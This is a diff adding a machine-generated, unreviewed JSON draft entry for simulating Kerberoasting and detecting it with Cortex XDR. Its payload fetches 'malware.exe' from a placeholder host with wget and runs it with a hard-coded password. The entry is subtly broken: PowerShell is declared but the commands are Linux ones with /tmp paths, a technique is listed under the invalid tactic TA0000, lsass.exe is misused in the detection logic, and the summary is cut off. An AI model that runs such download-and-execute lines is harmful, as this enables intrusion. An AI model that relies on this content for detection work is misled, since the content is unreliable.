@@ -1,0 +1,195 @@
+{
+  "id": "TTP-0000-0064",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Abnormal User Login to Domain Controller via Kerberoasting",
+    "summary": "An attacker uses a compromised user account to request service tickets for high-privilege accounts, then attempts to crack them offline. Cortex should detect abnormal login behavior and process execut",
+    "description": "An attacker uses a compromised user account to request service tickets for high-privilege accounts, then attempts to crack them offline. Cortex should detect abnormal login behavior and process execution patterns associated with Kerberoasting."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1548",
+        "subtechnique_id": "T1548.002",
+        "name": "T1548.002",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      },
+      {
+        "technique_id": "T1078",
+        "subtechnique_id": "T1078.002",
+        "name": "Valid Accounts: Domain Accounts",
+        "tactic_ids": [
+          "TA0004",
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Privilege Escalation",
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1558",
+        "subtechnique_id": "T1558.003",
+        "name": "Steal or Forge Kerberos Tickets: Kerberoasting",
+        "tactic_ids": [
+          "TA0006"
+        ],
+        "tactic_names": [
+          "Credential Access"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "wget http://192.0.2.10/malware.exe -O /tmp/kerberoast.exe\nstub chmod +x /tmp/kerberoast.exe\nstub /tmp/kerberoast.exe --target DC01.domain.local --user compromised_user@domain.local --password P@ssw0rd123\nstub /tmp/kerberoast.exe --extract --ticket TGS_Ticket_123456\nstub /tmp/kerberoast.exe --crack --hashes TGS_Ticket_123456\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Execution of kerberoast tool",
+        "expected_value": "action_process_image_name = '/tmp/kerberoast.exe'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Connection to domain controller",
+        "expected_value": "dst_ip = '192.0.2.50' and dst_port = 88"
+      },
+      {
+        "artifact_type": "file",
+        "description": "Service ticket extraction",
+        "expected_value": "action_file_path = '/tmp/ticket_extracted.kirbi'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Unusual Process Execution from Temp Directory",
+        "description": "Detection of process execution from temporary directory with Kerberoasting behavior",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name contains '/tmp/' and action_process_image_name contains 'kerberoast'\n| filter actor_process_image_name = 'lsass.exe' or actor_process_image_name = 'cmd.exe'\n",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1078.002",
+          "T1558.003"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Abnormal User Login to Domain Controller",
+        "description": "Detection of user login to domain controller with unusual timing or context",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK_CONNECTION\n| filter action_remote_ip = '192.0.2.50' and dst_port = 88\n| filter actor_process_image_name = 'lsass.exe'\n| filter causality_actor_process_image_name = 'svchost.exe'\n",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "process_start",
+        "mitre_technique_ids": [
+          "T1548.002",
+          "T1078.002",
+          "T1558.003"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Kerberoasting Network Activity",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK_CONNECTION\n| filter action_remote_ip = '192.0.2.50' and dst_port = 88\n| filter actor_process_image_name = 'lsass.exe'\n",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Abnormal User Login to Domain Controller; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/abnormal-user-login-to-domain-controller"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Abnormal User Login to Domain Controller",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/abnormal-user-login-to-domain-controller",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1548.002",
+      "url": "https://attack.mitre.org/techniques/T1548/002/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1078.002",
+      "url": "https://attack.mitre.org/techniques/T1078/002/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1558.003",
+      "url": "https://attack.mitre.org/techniques/T1558/003/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
